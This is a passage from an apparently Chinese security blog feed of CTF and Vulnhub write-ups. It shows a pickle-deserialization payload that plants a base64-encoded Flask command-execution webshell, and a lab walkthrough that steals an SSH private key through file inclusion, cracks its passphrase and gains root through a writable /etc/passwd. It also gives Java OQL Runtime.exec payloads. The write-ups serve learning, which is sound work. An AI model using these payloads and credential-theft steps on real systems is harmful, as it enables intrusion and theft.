aW1wb3J0IG9zCmZyb20gZmxhc2sgaW1wb3J0IEZsYXNrLCBzZXNzaW9uLCByZXF1ZXN0LCBzZW5kX2ZpbGUKCmFwcCA9IEZsYXNrKF9fbmFtZV9fKQoKQGFwcC5yb3V0ZSgnL2NtZCcsIG1ldGhvZHM9WydQT1NUJ10pCmRlZiBteWNtZCgpOgogICAgaGFuZGxlID0gb3MucG9wZW4ocmVxdWVzdC5mb3JtLmdldCgnY21kJykpICAKICAgIHJldCA9IGhhbmRsZS5yZWFkKCkgIAogICAgaGFuZGxlLmNsb3NlKCkKICAgIHJldHVybiByZXQKCmlmIF9fbmFtZV9fPT0nX19tYWluX18nOgogICAgYXBwLnJ1bihkZWJ1Zz1UcnVlLCBob3N0PSIwLjAuMC4wIikK |base64 -d &gt; app.py&#x27;)&quot;</span>,))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个myflaskrce类的实例</span></span><br><span class="line">malicious_object = myflaskrce()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用pickle模块将对象序列化为字节串，并使用base64进行编码</span></span><br><span class="line">payload = base64.b64encode(pickle.dumps(malicious_object))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个字典，用于存储表单数据</span></span><br><span class="line">post_params = &#123;<span class="string">&#x27;pickle_data&#x27;</span>: payload&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用urlencode函数对表单数据进行URL编码</span></span><br><span class="line">encoded_params = urlencode(post_params)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印编码后的表单数据</span></span><br><span class="line"><span class="built_in">print</span>(encoded_params)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240218011429027.png" alt="image-20240218011429027"></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240218011344391.png" alt="image-20240218011344391"></p><p>不知道是不是hackbar 还是环境坏了的问题  重启一下环境 使用bp 然后写进&#x2F;cmd   也成功RCE</p><hr><blockquote><p>search4member与梅开二度</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">一个是有关java的堆叠注入 一个是有关go的ssti xss</span><br><span class="line">(暂未吃透)</span><br></pre></td></tr></table></figure><p>推荐官方wp进行学习以及<a href="https://www.itbaoku.cn/post/3261173.html">HGAME 2024 WEEK2 Web方向题解全 </a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>EvilBox_One</title>
      <link href="/2024/02/08/EvilBox-One/"/>
      <url>/2024/02/08/EvilBox-One/</url>
      
        <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">渗透机:192.168.50.216</span><br><span class="line">靶机:192.168.50.51</span><br></pre></td></tr></table></figure><h2 id="端口探针"><a href="#端口探针" class="headerlink" title="端口探针"></a>端口探针</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- 192.168.50.51</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240208174329629.png" alt="image-20240208174329629"></p><h2 id="服务探针"><a href="#服务探针" class="headerlink" title="服务探针"></a>服务探针</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p22,80 -sV 192.168.50.51</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240208174506957.png" alt="image-20240208174506957"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh与http  ssh爆破  没有爆破出来</span><br><span class="line">http  是一个apache的首页页面</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240209005833017.png" alt="image-20240209005833017"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发现没有什么可利用  需要进行其他的信息收集</span><br></pre></td></tr></table></figure><h2 id="目录爆破-gobuster"><a href="#目录爆破-gobuster" class="headerlink" title="目录爆破(gobuster)"></a>目录爆破(gobuster)</h2><blockquote><p>使用了新的一个工具gobuster</p><p>主要是利用了kali自带的一个字典(接下来会说这个字典的强大)</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.50.51 -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,html,jsp</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240208180122061.png" alt="image-20240208180122061"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">依次跳转</span><br><span class="line">robots.txt 只有 Hello H4x0r</span><br><span class="line">访问/secret/ 发现也没有什么回显</span><br><span class="line">继续跟随着目录继续爆</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.50.51/secret/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,html,jsp</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240208202034695.png" alt="image-20240208202034695"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在/secret/  发现了evil.php</span><br></pre></td></tr></table></figure><blockquote><p>&#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Discovery&#x2F;Web-Content&#x2F;directory-list-1.0.txt</p><p>(kali自带)   我曾使用dirb，dirsearch默认字典没有跑出evil.php</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在evil.php  返回还是空白页面</span><br><span class="line">php作为服务器语言  可以尝试参数爆破 </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240209005700722.png" alt="image-20240209005700722"></p><h2 id="参数爆破"><a href="#参数爆破" class="headerlink" title="参数爆破"></a>参数爆破</h2><blockquote><p>可以bp联合爆破</p><p>亦可以使用ffuf</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">字典选择：</span><br><span class="line">/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:PARAM -w val.txt:VAL -u http://192.168.50.51/secret/evil.php?PARAM=VAL -fs 0</span><br><span class="line">一开始 val.txt 是自己添加的一些字符</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240209010005363.png" alt="image-20240209010005363"></p><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><blockquote><p>-fs 0       &#x2F;&#x2F;屏蔽结果为0的结果</p><p>之所以选择..&#x2F;index.html 是因为我们已知原本首页是apache起始页面</p><p>且当前运行的位置在&#x2F;secret&#x2F;目录</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">发现 上面未果  尝试文件包含</span><br><span class="line">ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://192.168.50.51/secret/evil.php?FUZZ=../index.html -fs 0</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240208224457005.png" alt="image-20240208224457005"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发现爆破出参数为command</span><br></pre></td></tr></table></figure><h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240209010552331.png" alt="image-20240209010552331"></p><h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在渗透机上写webshell</span><br><span class="line">然后使用文件包含点去包含渗透机</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240208232127580.png" alt="image-20240208232127580"></p><blockquote><p>并没有执行webshell，想来靶机没有开启远程包含（就当一个思路点记录下来了）</p></blockquote><h3 id="PHP封装器"><a href="#PHP封装器" class="headerlink" title="PHP封装器"></a>PHP封装器</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用PHP伪协议</span><br><span class="line">php://filter/convert.base64-encode/resource=evil.php</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240208231343530.png" alt="image-20240208231343530"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">可以尝试本地写入webshell</span><br><span class="line">php://input      POST部分去执行php命令</span><br><span class="line">或者data伪协议去写入webshell</span><br><span class="line">data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240209010659097.png" alt="image-20240209010659097"></p><blockquote><p>都失败了，想来没有写入的权限</p></blockquote><h2 id="SSH公钥登录"><a href="#SSH公钥登录" class="headerlink" title="SSH公钥登录"></a>SSH公钥登录</h2><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240208234313230.png" alt="image-20240208234313230"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">根据/etc/passwd文件 我们可知mowree我们是可以登陆的 </span><br><span class="line">我们可以尝试的ssh爆破 或者进行其他操作</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh mowree@192.168.50.51 -v</span><br><span class="line">-v 打印详细信息</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240209011106250.png" alt="image-20240209011106250"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发现登陆mowree 有两种方式</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">我们可以根据文件包含去尝试获取公私钥</span><br><span class="line">ssh公私钥 默认在用户家目录/.ssh/下</span><br><span class="line">故：</span><br><span class="line">../../../../../../home/mowree/.ssh/authorized_keys  远程服务器登陆的公钥</span><br><span class="line">../../../../../../home/mowree/.ssh/id_rsa</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240208235335533.png" alt="image-20240208235335533"></p><blockquote><p>有此文件 说明存在ssh公钥登陆  且说明加密算法为rsa</p></blockquote><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240208235452132.png" alt="image-20240208235452132"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">得到私钥</span><br></pre></td></tr></table></figure><blockquote><p>小插曲</p></blockquote><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240209013221304.png" alt="image-20240209013221304"></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240209012353952.png" alt="image-20240209012353952"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">同样是复制id_rsa然后尝试登陆  使用root与普通用户爆出来的错误不一样</span><br></pre></td></tr></table></figure><blockquote><p>一开始想着以为是root用户和普通用户导致的问题</p><p>报错是ssh“权限太开放”   想来还是chmod 777 给的权限太高了</p></blockquote><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240209001159774.png" alt="image-20240209001159774"></p><blockquote><p>Enter passphrase for key ‘id_rsa’</p><p>发现私钥中仍然有 passphrase</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可以尝试hashcat，john爆破</span><br></pre></td></tr></table></figure><h3 id="john爆破passphrase"><a href="#john爆破passphrase" class="headerlink" title="john爆破passphrase"></a>john爆破passphrase</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh2john id_rsa &gt; hash</span><br><span class="line">john hash --wordlist=/usr/share/wordlists/rockyou.txt 是 </span><br><span class="line">/usr/share/wordlists/rockyou.txt 是 kali自带超大字典</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240209002448687.png" alt="image-20240209002448687"></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240209002533252.png" alt="image-20240209002533252"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">成功登陆进mowree 且获取到第一个flag</span><br></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 2&gt;/dev/null</span><br><span class="line">寻找特殊权限位</span><br><span class="line">find / -perm -2000 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240209003123544.png" alt="image-20240209003123544"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发现没有可利用点</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find / writeable 2&gt;/dev/null</span><br><span class="line">寻找可写文件</span><br><span class="line">数量很多</span><br><span class="line">小tips: /proc/ 、/run/ 、 /sys/  可以过滤掉</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240209004032504.png" alt="image-20240209004032504"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发现/etc/passwd 可写</span><br></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240209004110097.png" alt="image-20240209004110097" style="zoom:150%;" /><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240209012027579.png" alt="image-20240209012027579"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">密文可以使用 openssl 生成</span><br><span class="line">openssl passwd -1 123</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240209012114025.png" alt="image-20240209012114025"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br><span class="line">使用密码123即可成功提权且获得了第二个flag</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Vulnhub </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HGAME 2024 WEEK 1 wp</title>
      <link href="/2024/02/06/HGAME-2024-WEEK-1-Web-wp/"/>
      <url>/2024/02/06/HGAME-2024-WEEK-1-Web-wp/</url>
      
        <content type="html"><![CDATA[<h2 id="ezHTTP"><a href="#ezHTTP" class="headerlink" title="ezHTTP"></a>ezHTTP</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">描述:HTTP Protocol Basics</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">bp发包即可</span><br><span class="line"></span><br><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: 106.15.72.34:31944</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Vidar; VidarOS x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">x-real-ip: 127.0.0.1</span><br><span class="line">referer: vidar.club</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240206193735049.png" alt="image-20240206193735049"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">页面返回 flag已经给我们了,,,  </span><br><span class="line">继续观察返回包  发现 认证部分有有趣的东西</span><br></pre></td></tr></table></figure><p>很显然是一个JWT算法</p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240206194112086.png" alt="image-20240206194112086"></p><h2 id="Bypass-it"><a href="#Bypass-it" class="headerlink" title="Bypass it"></a>Bypass it</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">描述:This page requires javascript to be enabled :)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240206194516189.png" alt="image-20240206194516189"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">就只有登陆注册 功能 尝试一下弱口令 发现没登陆进去</span><br><span class="line">注册页面 还不允许注册</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240206194751522.png" alt="image-20240206194751522"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">通过提示  使用了javascript   </span><br><span class="line">可以想着禁用JS或者拦截返回包或者通过登陆包来构造注册包</span><br></pre></td></tr></table></figure><blockquote><p>bp拦截响应包</p></blockquote><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240206200206737.png" alt="image-20240206200206737"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发现由于JavaScript会跳转到login.html  尝试更换成register.html</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240207020835872.png" alt="image-20240207020835872"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">给我们跳转到了用户注册页面  随机注册个用户试试</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240206200458064.png" alt="image-20240206200458064"></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240206200513541.png" alt="image-20240206200513541"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注册成功  登陆即可获得flag</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240206200615454.png" alt="image-20240206200615454"></p><blockquote><p>其实可以根据登陆包直接构造出一个注册包 login改成register即可</p></blockquote><h2 id="Select-Courses"><a href="#Select-Courses" class="headerlink" title="Select Courses"></a>Select Courses</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">描述:Can you help ma5hr00m select the desired courses?</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240206201630697.png" alt="image-20240206201630697"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原本一直都不知道考点是什么  但是随便点击  发现就选上了一个  </span><br><span class="line">然后就尝试写了一个简易脚本(根据数据包) 一直选择课程 直到选上之后结束</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://106.14.57.14:32702/api/courses&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;id&quot;</span>: <span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">        data[<span class="string">&quot;id&quot;</span>] = i</span><br><span class="line">        response = requests.post(url, json=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;&quot;full&quot;:0&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Response for id=<span class="subst">&#123;i&#125;</span>: <span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">运行脚本 是一个随机性的问题  等一会 出现完所有课程id 即 选课完了</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240206212919536.png" alt="image-20240206212919536"></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240206213224930.png" alt="image-20240206213224930"></p><blockquote><p>比赛时候的脚本是简历脚本课程一个个跑 然后换课程<br>赛后看网上wp整了跑新全课程脚本</p><p>亦可以bp 攻击模块选课</p></blockquote><h2 id="2048-16"><a href="#2048-16" class="headerlink" title="2048*16"></a>2048*16</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">描述：2048还是太简单了，柏喵喵决定挑战一下2048*16</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">前端2048游戏  需要我们玩到32768 (显然很难玩到，游戏大神除外)</span><br><span class="line">查看源代码 发现程序设置了禁止调试且做了JS混淆　　</span><br><span class="line">继续翻翻JS代码　看看能不能翻到什么有趣的东西吧</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240206191944385.png" alt="image-20240206191944385"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">发现了明显特征 game-won  可以猜测密文/表有可能为</span><br><span class="line">V+g5LpoEej/fy0nPNivz9SswHIhGaDOmU8CuXb72dB1xYMrZFRAl=QcTq6JkWK4t3</span><br><span class="line">且根据代码 寻找x</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240207021105863.png" alt="image-20240207021105863"></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240206192734458.png" alt="image-20240206192734458"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">经尝试  此处含密文</span><br><span class="line">I7R8ITMCnzbCn5eFIC=6yliXfzN=I5NMnz0XIC==yzycysi70ci7y7iK</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240206192953722.png" alt="image-20240206192953722"></p><p>一个换表的base64(个人感受是挺无语的,我翻挺久的…..)</p><h2 id="jhat"><a href="#jhat" class="headerlink" title="jhat"></a>jhat</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">描述:</span><br><span class="line">jhat is a tool used for analyzing Java heap dump files</span><br><span class="line">提示1  hint1: need rce</span><br><span class="line">提示2  hint2: focus on oql</span><br><span class="line">提示3  hint3: 题目不出网 想办法拿到执行结果</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">附件给了dockerfile.txt</span><br><span class="line">FROM openjdk:8</span><br><span class="line"># 指定新镜像的基础镜像</span><br><span class="line">COPY data /</span><br><span class="line"># 将宿主机的data目录中的文件复制到根目录</span><br><span class="line">CMD jhat heapdump.hprof</span><br><span class="line"># CMD 指定容器启动时默认执行的命令</span><br><span class="line"># jhat命令对 heapdump.hprof文件进行分析</span><br><span class="line"># jhat 是Java堆分析工具,用于分析Java堆转储文件</span><br><span class="line">EXPOSE 7000</span><br><span class="line"># 告知docker容器暴露出来的端口   docker的监听端口</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jhat  有关java安全 只能说自己学的还是少了 只能根据遇到的题目 继续去学习</span><br></pre></td></tr></table></figure><blockquote><p>jhat是jdk内置的工具之一。主要是用来分析java堆的命令，可以将堆中的对象以html的形式显示出来，包括对象的数量，大小等等，并支持对象查询语言</p></blockquote><blockquote><p> OQL是一种类似于SQL的查询语言，主要用于在Java虚拟机（JVM）的堆内存中进行对象的查找和筛选。</p></blockquote><p>参考:<a href="https://wooyun.js.org/drops/OQL(%E5%AF%B9%E8%B1%A1%E6%9F%A5%E8%AF%A2%E8%AF%AD%E8%A8%80">OQL(对象查询语言)在产品实现中造成的RCE(Object Injection) - Nebula (wooyun.js.org)</a>在产品实现中造成的RCE(Object Injection).html)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(&quot;cat flag&quot;).getInputStream(),&quot;gbk&quot;)).readLine()</span><br></pre></td></tr></table></figure><blockquote><p>第一个获取的RCE不完全  下面官方RCE相对于第一个 获取的shell更完整</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new java.util.Scanner(java.lang.Runtime.getRuntime().exec(&#x27;cat /flag&#x27;).getInputStream())</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240207021325809.png" alt="image-20240207021325809"></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240207011034227-1707239592255-33.png" alt="image-20240207011034227"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>hello-world</title>
      <link href="/2024/02/02/hello-world/"/>
      <url>/2024/02/02/hello-world/</url>
      
        <content type="html"><![CDATA[<p>这里是我的博客，</p><p>我将在这里记录我的成长历程！</p><blockquote><p>该站点图片资源加载过慢，需要magic访问,效果可能会比较好些 </p></blockquote>]]></content>
      
      
      
